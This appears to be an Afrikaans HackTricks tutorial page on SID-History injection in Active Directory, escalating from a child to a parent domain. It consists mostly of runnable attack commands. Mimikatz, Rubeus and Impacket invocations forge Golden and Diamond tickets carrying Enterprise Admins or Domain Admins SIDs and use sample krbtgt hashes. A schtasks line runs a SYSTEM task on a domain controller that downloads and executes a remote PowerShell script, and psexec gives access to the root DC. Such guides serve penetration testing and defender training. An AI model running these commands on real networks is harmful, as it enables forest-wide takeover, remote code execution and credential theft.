# SID-History Inspuiting

{{#include ../../banners/hacktricks-training.md}}

## SID History Inspuiting Aanval

Die fokus van die **SID History Inspuiting Aanval** is om **gebruikermigrasie tussen domeine** te ondersteun terwyl toegang tot hulpbronne van die vorige domein verseker word. Dit word bereik deur **die gebruiker se vorige Veiligheidsidentifiseerder (SID) in die SID Geskiedenis** van hul nuwe rekening in te sluit. Dit is belangrik om te noem dat hierdie proses gemanipuleer kan word om ongeoorloofde toegang te verleen deur die SID van 'n hoë-privilege groep (soos Enterprise Admins of Domain Admins) van die ouerdomein by die SID Geskiedenis te voeg. Hierdie uitbuiting bied toegang tot alle hulpbronne binne die ouerdomein.

Twee metodes bestaan om hierdie aanval uit te voer: deur die skep van 'n **Golden Ticket** of 'n **Diamond Ticket**.

Om die SID vir die **"Enterprise Admins"** groep te bepaal, moet 'n mens eers die SID van die worteldomein vind. Na identifikasie kan die Enterprise Admins groep SID gebou word deur `-519` by die worteldomein se SID te voeg. Byvoorbeeld, as die worteldomein SID `S-1-5-21-280534878-1496970234-700767426` is, sal die resulterende SID vir die "Enterprise Admins" groep `S-1-5-21-280534878-1496970234-700767426-519` wees.

Jy kan ook die **Domain Admins** groepe gebruik, wat eindig op **512**.

'n Ander manier om die SID van 'n groep van die ander domein (byvoorbeeld "Domain Admins") te vind, is met:
```powershell
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
### Goue Kaart (Mimikatz) met KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Vir meer inligting oor goue kaartjies, kyk:

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamantkaartjie (Rubeus + KRBTGT-AES256)
```powershell
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap

# Or a ptt with a golden ticket
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt

# You can use "Administrator" as username or any other string
```
Vir meer inligting oor diamantkaartjies, kyk:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Verhoog na DA van wortel of Enterprise admin deur die KRBTGT-hash van die gecompromitteerde domein:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Met die verkregen toestemmings van die aanval kan jy byvoorbeeld 'n DCSync-aanval in die nuwe domein uitvoer:

{{#ref}}
dcsync.md
{{#endref}}

### Van linux

#### Handmatig met [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Outomaties met [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Dit is 'n Impacket-skrip wat **outomaties die opgradering van kind- na ouer-domein** sal uitvoer. Die skrip benodig:

- Teiken-domeinbeheerder
- Kredensies vir 'n admin-gebruiker in die kind-domein

Die vloei is:

- Verkry die SID vir die Enterprise Admins-groep van die ouer-domein
- Herwin die hash vir die KRBTGT-rekening in die kind-domein
- Skep 'n Golden Ticket
- Meld aan by die ouer-domein
- Herwin kredensies vir die Administrator-rekening in die ouer-domein
- As die `target-exec` skakel gespesifiseer is, verifieer dit by die ouer-domein se Domeinbeheerder via Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Verwysings

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
